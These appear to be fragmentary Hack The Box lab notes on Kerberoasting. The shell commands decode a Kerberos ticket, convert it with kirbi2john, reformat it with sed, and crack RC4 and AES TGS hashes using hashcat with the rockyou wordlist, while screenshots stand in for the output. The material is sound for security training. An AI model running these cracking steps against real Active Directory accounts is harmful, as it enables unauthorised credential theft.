...
```shell-session
slomkm@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n 
...
```shell-session
slomkm@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi
```
...
```shell-session
slomkm@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi
```
...
```shell-session
slomkm@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
...
```shell-session
slomkm@htb[/htb]$ cat sqldev_tgs_hashcat 
...
```shell-session
slomkm@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
...
![[Z Assets/Images/06d960282a0eb6277be22d565a3120d3_MD5.gif]]
...
```shell-session
slomkm@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
...
![[Z Assets/Images/4026f8bda67f85a5deee6380f9075370_MD5.webp]]
...
```shell-session
slomkm@htb[/htb]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
...
![[Z Assets/Images/d1ecc47e4a8a10976181ed9dc451b33a_MD5.webp]]
...
![[Z Assets/Images/eabaa158b358e82424dac3c9a188a4db_MD5.webp]]
...
![[Z Assets/Images/4447d3738cab8a31cc9fc8c3246e75e7_MD5.webp]]
...
![[Z Assets/Images/6f6beff0475e9b4a8a4aa46f0e071c17_MD5.webp]]
